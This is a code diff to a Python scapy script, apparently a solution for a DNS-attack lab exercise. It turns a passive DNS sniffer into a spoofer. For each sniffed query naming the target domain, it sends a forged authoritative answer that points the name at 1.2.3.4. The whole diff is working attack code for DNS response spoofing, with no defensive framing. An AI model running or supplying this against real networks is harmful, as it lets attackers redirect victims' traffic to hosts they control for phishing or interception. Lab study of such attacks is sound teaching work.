@@ -1,5 +1,6 @@
 from scapy.all import *
-from scapy.layers.dns import DNS
+from scapy.layers.dns import DNS, DNSQR, DNSRR
+from scapy.layers.inet import IP, UDP
 
 ATTACKER_NS = "ns.attacker32.com"
 ATTACKER_IFACE = "br-fa8ae839be42"
@@ -13,9 +14,33 @@ class Task:
 
         def spoof_dns(pkt):
             if DNS in pkt and TARGET in pkt[DNS].qd.qname.decode("utf-8"):
-                print(pkt.summary())
+                print(f"Got: {pkt.summary()}")
 
-        _ = sniff(iface=ATTACKER_IFACE, prn=spoof_dns, filter="port 53")
+                resp = (
+                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
+                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+                    / DNS(
+                        id=pkt[DNS].id,
+                        qr=1,
+                        aa=1,
+                        qd=pkt[DNS].qd,
+                        an=DNSRR(
+                            rrname=pkt[DNSQR].qname,
+                            type="A",
+                            rclass="IN",
+                            ttl=30,
+                            rdata="1.2.3.4",
+                        ),
+                    )
+                )
+
+                send(resp)
+
+        _ = sniff(
+            iface=ATTACKER_IFACE,
+            prn=spoof_dns,
+            filter=f"port 53 and not ether src {get_if_hwaddr(ATTACKER_IFACE)}",
+        )
 
 
 if __name__ == "__main__":
